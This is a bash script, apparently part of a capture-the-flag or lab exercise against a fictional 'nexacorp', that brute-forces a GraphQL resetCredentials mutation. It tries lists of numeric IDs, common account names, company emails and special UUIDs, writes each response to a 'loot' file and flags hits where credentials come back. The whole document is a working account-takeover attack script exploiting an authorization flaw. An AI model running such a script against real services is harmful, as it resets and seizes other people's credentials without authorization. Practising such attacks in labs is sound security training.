#!/usr/bin/env bash
# Brute-force de resetCredentials con IDs comunes
# La pista: "Una credencial destinada a otra persona termina en tus manos"
set -euo pipefail
source "$(dirname "$0")/00_config.sh"

OUT="${LOOT_DIR}/reset_results.txt"
: > "${OUT}"

echo "[*] Brute-force resetCredentials(userId: ID!)"
echo "    Resultados en: ${OUT}"
echo

# Lista 1: IDs numéricos típicos
NUMERIC_IDS=(0 1 2 3 4 5 6 7 8 9 10 100 999 1000)

# Lista 2: Strings comunes
STRING_IDS=(admin root administrator superuser system service api ceo cto
            nexacorp support helpdesk security devops sre user guest demo
            test default master owner manager)

# Lista 3: Emails típicos
EMAIL_IDS=(admin@nexacorp.local admin@nexacorp.com root@nexacorp.local
           administrator@nexacorp.local security@nexacorp.local
           support@nexacorp.local devops@nexacorp.local)

# Lista 4: UUIDs especiales
UUID_IDS=("00000000-0000-0000-0000-000000000000"
          "00000000-0000-0000-0000-000000000001"
          "11111111-1111-1111-1111-111111111111")

probe() {
  local id="$1"
  local resp
  resp=$(curl -s -X POST "${GQL_URL}" \
    -H "Content-Type: application/json" \
    -d "{\"query\":\"mutation { resetCredentials(userId: \\\"${id}\\\") }\"}")
  echo "[$id] ${resp}" | tee -a "${OUT}"

  # Marca un hit si resetCredentials no es null y no hay errors
  local val
  val=$(echo "${resp}" | jq -r '.data.resetCredentials // empty' 2>/dev/null || true)
  if [[ -n "${val}" && "${val}" != "null" ]]; then
    echo "  >>> HIT: ${id} -> ${val}" | tee -a "${OUT}"
  fi
}

echo "=== IDs numéricos ==="
for id in "${NUMERIC_IDS[@]}"; do probe "${id}"; done

echo
echo "=== IDs string ==="
for id in "${STRING_IDS[@]}"; do probe "${id}"; done

echo
echo "=== Emails ==="
for id in "${EMAIL_IDS[@]}"; do probe "${id}"; done

echo
echo "=== UUIDs ==="
for id in "${UUID_IDS[@]}"; do probe "${id}"; done

echo
echo "[*] Hits encontrados:"
grep ">>> HIT" "${OUT}" || echo "    (ninguno — revisa el bundle JS para IDs reales)"
